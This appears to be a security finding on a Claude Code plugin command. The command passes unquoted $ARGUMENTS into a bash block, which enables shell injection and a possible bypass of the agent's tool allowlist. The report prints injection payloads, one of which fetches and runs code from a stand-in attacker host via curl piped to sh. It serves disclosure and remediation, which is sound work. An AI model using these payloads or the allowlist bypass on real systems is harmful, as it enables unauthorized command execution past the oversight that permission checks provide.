### Title
Unquoted `$ARGUMENTS` in Bash execution block enables shell metacharacter injection - (File: plugins/ralph-wiggum/commands/ralph-loop.md)

### Summary
The `/ralph-loop` command's markdown body embeds `$ARGUMENTS` unquoted directly inside a `` ```! `` bash execution block: `"${CLAUDE_PLUGIN_ROOT}/scripts/setup-ralph-loop.sh" $ARGUMENTS`. Because `$ARGUMENTS` is textually substituted into the shell command string before that string is handed to the Bash tool, attacker-controlled text containing `;`, backticks, or `$(...)` becomes part of the shell grammar itself rather than a literal argv token passed to `setup-ralph-loop.sh`.

### Finding Description
`plugins/ralph-wiggum/commands/ralph-loop.md` declares `allowed-tools: ["Bash(${CLAUDE_PLUGIN_ROOT}/scripts/setup-ralph-loop.sh:*)"]` [1](#0-0) , and then executes:

```
"${CLAUDE_PLUGIN_ROOT}/scripts/setup-ralph-loop.sh" $ARGUMENTS
``` [2](#0-1) 

`$ARGUMENTS` is the raw, unquoted text typed after `/ralph-loop`. Per this repo's own command-development documentation, `$ARGUMENTS` is "All arguments as single string" that gets textually expanded into the command block [3](#0-2) , and the `!`command`` syntax runs the resulting text as a shell command [4](#0-3) . Because the substitution happens before the string reaches a shell parser, any shell metacharacters in the user-supplied prompt (`;`, `` ` ``, `$()`, `&&`, `|`) become live shell syntax rather than literal argv content delivered to `setup-ralph-loop.sh`'s own (safe) `while [[ $# -gt 0 ]]` argument loop [5](#0-4) . The script itself is not the weak point — its internal parsing and heredoc usage are reasonably safe — the injection point is one layer up, in how the command markdown builds the shell string handed to the Bash tool.

The `allowed-tools` value `Bash(${CLAUDE_PLUGIN_ROOT}/scripts/setup-ralph-loop.sh:*)` is a prefix-style glob. Whether this glob check inspects the *entire* resulting command line for chained/substituted sub-commands (and denies unless every sub-command also matches the allow-pattern) or merely checks that the string starts with the allowed prefix is enforced by the Claude Code CLI's own Bash-tool permission engine, which is **not part of this repository** — this repo only contains plugin markdown/scripts, not the CLI's permission-matching implementation. This means the actual bypass depends on behavior that cannot be verified purely from this codebase.

### Impact Explanation
If the underlying permission engine does not sanitize/split compound commands, an attacker who can get a maintainer to paste malicious text into `/ralph-loop <text>` (e.g., copy-pasted from an issue/PR) could achieve command execution outside the intended `setup-ralph-loop.sh:*` allowlist, e.g. `/ralph-loop foo; touch pwned` or `/ralph-loop $(curl attacker.com/x|sh)`. This would be an "unauthorized command execution / allowlist bypass" class finding matching Claude Code's bounty impact for approval/allowlist bypass.

### Likelihood Explanation
Exploitability hinges entirely on the Claude Code CLI's Bash-tool permission engine, which is external to this repository. If that engine correctly parses shell operators/substitutions in the assembled command string and denies unless every sub-command matches an allowed pattern (a documented anti-bypass design goal of such allowlists), the attack is blocked regardless of this plugin's unquoted usage. This repo provides no evidence either way of that engine's parsing behavior, so likelihood cannot be confirmed from repo context alone — it is a plausible but unverified precondition.

### Recommendation
Regardless of whether the core CLI already blocks this, the plugin should not rely on unquoted `$ARGUMENTS` inside a raw bash block. Prefer passing the prompt via a safer mechanism (e.g., quoting `"$ARGUMENTS"`, or having the script read the prompt from stdin/a temp file written by Claude rather than via shell-expanded positional arguments), and update `plugins/plugin-dev/skills/command-development` guidance to warn against unquoted `$ARGUMENTS` usage in `` ```! `` blocks generally.

### Proof of Concept
Integration test plan (requires access to actual Claude Code CLI, not present in this repo): invoke `/ralph-loop foo; touch /tmp/pwned` and `/ralph-loop $(id > /tmp/pwned2)` through the real Claude Code command dispatcher (not by calling `setup-ralph-loop.sh` directly, since that already safely treats args as argv). Assert `/tmp/pwned` and `/tmp/pwned2` are NOT created and that the Bash tool call is either denied outright or executed as a single safe invocation of `setup-ralph-loop.sh` with the entire malicious string as one literal prompt argument. This PoC can only be executed against the actual Claude Code CLI/permission engine, which is outside this repository's index — I could not verify its behavior here, so this should be validated by a Devin session with terminal/CLI access to the real Claude Code product rather than static analysis of this plugin repo.
